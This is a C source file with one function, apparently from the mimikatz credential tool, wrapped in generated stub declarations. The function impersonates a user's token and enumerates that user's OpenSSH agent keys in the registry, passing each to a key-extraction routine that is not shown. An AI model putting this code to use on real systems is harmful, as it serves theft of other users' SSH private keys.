#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  char wchar_t ;
struct TYPE_3__ {char* pSid; scalar_t__ hToken; int /*<<< orphan*/ * member_1; int /*<<< orphan*/ * member_0; } ;
typedef  int /*<<< orphan*/  PKULL_M_REGISTRY_HANDLE ;
typedef  scalar_t__ LPCWSTR ;
typedef  TYPE_1__ KUHL_M_DPAPI_SSH_TOKEN ;
typedef  int /*<<< orphan*/  HKEY ;
typedef  int DWORD ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  CloseHandle (scalar_t__) ; 
 scalar_t__ ConvertStringSidToSid (scalar_t__,char**) ; 
 scalar_t__ FALSE ; 
 int KEY_READ ; 
 int KEY_WOW64_64KEY ; 
 int /*<<< orphan*/  LPTR ; 
 scalar_t__ LocalAlloc (int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  LocalFree (char*) ; 
 int /*<<< orphan*/  PRINT_ERROR_AUTO (char*) ; 
 int /*<<< orphan*/  kprintf (char*,...) ; 
 int /*<<< orphan*/  kuhl_m_dpapi_ssh_getKey (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int,char**,scalar_t__) ; 
 int /*<<< orphan*/  kuhl_m_dpapi_ssh_impersonate ; 
 int /*<<< orphan*/  kuhl_m_token_displayAccount (scalar_t__,scalar_t__) ; 
 int /*<<< orphan*/  kull_m_registry_RegCloseKey (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ kull_m_registry_RegEnumKeyEx (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int,char*,int*,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 scalar_t__ kull_m_registry_RegOpenKeyEx (int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ,int,int /*<<< orphan*/ *) ; 
 scalar_t__ kull_m_registry_RegQueryInfoKey (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int*,int*,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 scalar_t__ kull_m_string_args_byName (int,char**,char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 scalar_t__ kull_m_token_getTokensUnique (int /*<<< orphan*/ ,TYPE_1__*) ; 

void kuhl_m_dpapi_ssh_keys4user(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hUser, LPCWSTR szSID, int argc, wchar_t * argv[])
{
	HKEY hKeys, hEntry;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szKey;
	wchar_t * keyName;
	KUHL_M_DPAPI_SSH_TOKEN tokenData = {NULL, NULL};
	BOOL tokenToClose = FALSE;

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hUser, L"Software\\OpenSSH\\Agent\\Keys", 0, KEY_WOW64_64KEY | KEY_READ, &hKeys))
	{
		if(szSID && kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL))
		{
			kprintf(L" * Trying to get an impersonation token for %s: ", szSID);
			if(ConvertStringSidToSid(szSID, &tokenData.pSid))
			{
				if(tokenToClose = kull_m_token_getTokensUnique(kuhl_m_dpapi_ssh_impersonate, &tokenData))
				{
					kprintf(L"   ");
					kuhl_m_token_displayAccount(tokenData.hToken, FALSE);
				}
				else PRINT_ERROR_AUTO(L"kull_m_token_getTokensUnique/kull_m_token_getTokensUnique");
			}
			else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
		}

		if(kull_m_registry_RegQueryInfoKey(hRegistry, hKeys, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
		{
			szMaxSubKeyLen++;
			if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
			{
				for(i = 0; i < nbSubKeys; i++)
				{
					szKey = szMaxSubKeyLen;
					if(kull_m_registry_RegEnumKeyEx(hRegistry, hKeys, i, keyName, &szKey, NULL, NULL, NULL, NULL))
					{
						kprintf(L"\n   [%s] ", keyName);
						if(kull_m_registry_RegOpenKeyEx(hRegistry, hKeys, keyName, 0, KEY_READ, &hEntry))
						{
							kprintf(L"\n");
							kuhl_m_dpapi_ssh_getKey(hRegistry, hEntry,  argc, argv, tokenData.hToken);
							kull_m_registry_RegCloseKey(hRegistry, hEntry);
						}
						else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
					}
				}
				LocalFree(keyName);
			}
		}
		else PRINT_ERROR_AUTO(L"kull_m_registry_RegQueryInfoKey");

		if(tokenData.pSid)
			LocalFree(tokenData.pSid);
		if(tokenToClose && tokenData.hToken)
			CloseHandle(tokenData.hToken);
		kull_m_registry_RegCloseKey(hRegistry, hKeys);
	}
}